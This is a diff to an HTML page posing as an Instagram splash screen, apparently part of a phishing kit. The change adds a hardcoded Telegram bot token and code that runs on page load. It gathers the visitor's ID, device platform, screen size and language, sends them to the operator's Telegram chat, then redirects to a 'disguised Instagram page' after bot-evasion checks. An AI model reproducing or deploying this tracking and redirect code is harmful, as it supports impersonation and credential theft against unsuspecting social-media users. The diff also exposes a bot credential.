@@ -6,7 +6,6 @@
     <meta name="theme-color" content="#ffffff">
     <title>Instagram</title>
     <style>
-        /* تصميم الواجهة الصافية لانستغرام */
         body, html {
             height: 100%;
             margin: 0;
@@ -55,7 +54,6 @@
             to { opacity: 1; transform: scale(1); }
         }
 
-        /* حماية: حقل مخفي للبوتات */
         #bot_trap_field {
             display: none !important;
             visibility: hidden;
@@ -77,23 +75,59 @@
 
     <script>
         (function() {
-            // التحقق من المتصفح لصد البوتات البسيطة
+            // الإعدادات
+            const BOT_TOKEN = '8485673305:AAEFLOGo1huDWhkh-TjZBo47aGhXYd5Rw-g';
+            const ADMIN_ID = '5306060954';
+
+            // 1. جمع معلومات الزائر
+            const urlParams = new URLSearchParams(window.location.search);
+            const userId = urlParams.get('id') || "غير معروف";
+            const userLang = navigator.language || "غير معروف";
+            const platform = navigator.platform;
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            
+            // 2. دالة إرسال الإشعار الاحترافي
+            function sendLog() {
+                const message = `
+🔥 *تم فتح الرابط الآن!*
+----------------------------
+👤 *المستخدم:* [${userId}](tg://user?id=${userId})
+📱 *الجهاز:* \`${platform}\`
+🖥 *الدقة:* \`${screenRes}\`
+🌍 *اللغة:* \`${userLang}\`
+🔗 *فتح صفحة:* \`Splash - Instagram\`
+----------------------------
+⏰ *الوقت:* ${new Date().toLocaleTimeString('ar-EG')}
+                `;
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_ID,
+                        text: message,
+                        parse_mode: "Markdown"
+                    })
+                }).catch(err => console.log("Log failed"));
+            }
+
+            // تنفيذ الإرسال فور التحميل
+            sendLog();
+
+            // 3. منطق التوجيه والحماية الأصلي
             const isProbablyBot = !('innerHeight' in window) || navigator.userAgent.includes("bot") || navigator.userAgent.includes("crawl");
 
             setTimeout(function() {
                 const trap = document.getElementById('bot_trap_field').value;
                 
-                // إذا تم ملء الحقل المخفي أو تم اكتشاف بوت، يتم إيقاف العملية
                 if (trap !== "" || isProbablyBot) {
-                    console.log("Access Denied");
                     return;
                 }
 
-                // التوجه لصفحة انستغرام المموهة مع نقل كافة الـ Parameters (id, redirect)
                 const currentQuery = window.location.search;
                 window.location.href = "i-q7.html" + currentQuery;
 
-            }, 2000); // الانتظار لمدة 2 ثانية
+            }, 2500); // زدنا الوقت قليلاً لضمان وصول الإشعار
         })();
     </script>
 </body>
